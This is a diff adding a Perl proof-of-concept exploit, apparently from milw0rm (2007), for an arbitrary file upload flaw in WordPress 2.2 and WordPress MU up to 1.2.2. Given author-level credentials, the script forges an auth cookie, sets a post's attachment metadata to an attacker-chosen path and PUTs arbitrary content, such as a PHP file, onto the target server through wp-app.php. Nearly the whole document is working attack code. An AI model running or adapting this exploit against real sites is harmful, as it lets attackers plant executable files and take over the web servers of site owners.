@@ -1,0 +1,113 @@
+#! /usr/bin/env perl
+
+# Wordpress 2.2 and Wordpress MU <= 1.2.2 Arbitrary File Upload PoC
+#
+# Credits : Alexander Concha <alex at buayacorp dot com>
+# Website : http://www.buayacorp.com/
+# Advisory: http://www.buayacorp.com/files/wordpress/wordpress-advisory.html
+
+use Digest::MD5 qw(md5_hex);
+use LWP::UserAgent;
+
+my $ua = new LWP::UserAgent;
+my $blog        = $ARGV[0];
+my $user        = $ARGV[1];
+my $pass        = $ARGV[2];
+my $remote_file = $ARGV[3];
+my $local_file  = $ARGV[4];
+my $post_id     = $ARGV[5];
+
+if (@ARGV < 4) {
+       print "\nUsage:\n";
+       print " wp-file-upload.pl <host> <username> <password> <remote_filename> [local_file] [post_id]\n\n";
+       print " <host>        - full path to WordPress. http://victim.com/wordpress/\n";
+       print " <username>    - valid username with any of these roles: author, editor, administrator\n";
+       print " <password>    - valid password for the user\n";
+       print " <remote_file> - full path to the remote file. /home/vulnerable.com/wordpress/wp-content/uploads/foo.php\n";
+       print " [local_file]  - file to upload\n";
+       print " [post_id]     - every time this script is executed creates a new post, specify a post_ID if you already run it\n\n";
+       exit();
+}
+$ua->requests_redirectable([]);
+$blog =~ s/\/*$/\//;
+
+$url = 'wp-app.php';
+if ( 200 != $ua->head($url . '?action=/service')->code ) {
+       $url = 'app.php';
+       die "\nIt seems that this WP installation is not vulnerable: app.php and wp-app.php were not found.\n"
+               unless 200 == $ua->head($url . '?action=/service')->code;
+}
+
+$auth_cookie = get_auth_cookie();
+
+sub LWP::UserAgent::simple_request {
+       my($self, $request, $arg, $size) = @_;
+       $request->header('Cookie' => $auth_cookie);
+       $request->content_type('image/gif') if $request->method eq "PUT";
+       $request->uri($blog . $request->uri);
+
+       $self->_request_sanity_check($request);
+       my $new_request = $self->prepare_request($request);
+       $response = $self->send_request($new_request, $arg, $size);
+
+       print $request->method . " " . $request->uri . " " . $response->code . "\n";
+
+       return $response;
+}
+
+sub get_contents {
+       $file = shift;
+       if ( -e $file ) {
+               open FILE, $file or die("Invalid local file");
+               $file = join('', <FILE>);
+               close FILE;
+       } else {
+               $file = <<PHP;
+<?php echo "Hello World!"; ?>
+PHP
+       }
+       return $file;
+}
+sub get_auth_cookie {
+       $response = $ua->head('wp-login.php?logout');
+       if ( $response->headers->header('Set-Cookie') =~ m/wordpress(user|pass)(.*?)=/ ) {
+                       return "wordpressuser$2=$user;wordpresspass$2=".md5_hex(md5_hex($pass));
+       }
+       return '';
+}
+if (0 == $post_id) {
+       $response = $ua->get('wp-admin/post-new.php');
+       die ("\nInvalid credentials or blog url.\n\n" . $response->as_string) unless 200 == $response->code;
+
+       if ( $response->content =~ m/name=._wpnonce. value=.([a-z\d]{10})./ ) {
+               $response = $ua->post('wp-admin/post.php', [
+                       '_wpnonce' => $1,
+                       'action' => 'post',
+                       'post_ID' => $post_id,
+                       'post_type' => 'post',
+                       'post_title' => 'foo',
+                       'metakeyselect' => '#NONE#',
+                       'metakeyinput' => '_wp_attached_file',
+                       'metavalue' => $remote_file
+                       ], 'Cookie' => $auth_cookie);
+
+               # Checks for post-new.php?posted=post_ID
+               if ( $response->headers->header('Location') =~ m/posted=(\d+)/ ) {
+                       $post_id = $1;
+               }
+       }
+}
+die "\nCould not get a valid post_id value.\n" unless 0 != $post_id;
+
+$request = HTTP::Request->new(PUT => $url . '?action=/attachment/file/'.$post_id);
+$request->content(get_contents($local_file));
+$response = $ua->request($request);
+
+if ( 200 == $response->code ) {
+       print "\nIt seems that the file has been posted successfully... :P\n";
+       print "Use the following value to update the remote file: post_id '$post_id'\n";
+} else {
+       print "\nError: there is no attachment metadata for post_id=$post_id\n\n" . $response->as_string() . "\n";
+}
+
+# milw0rm.com [2007-06-26]
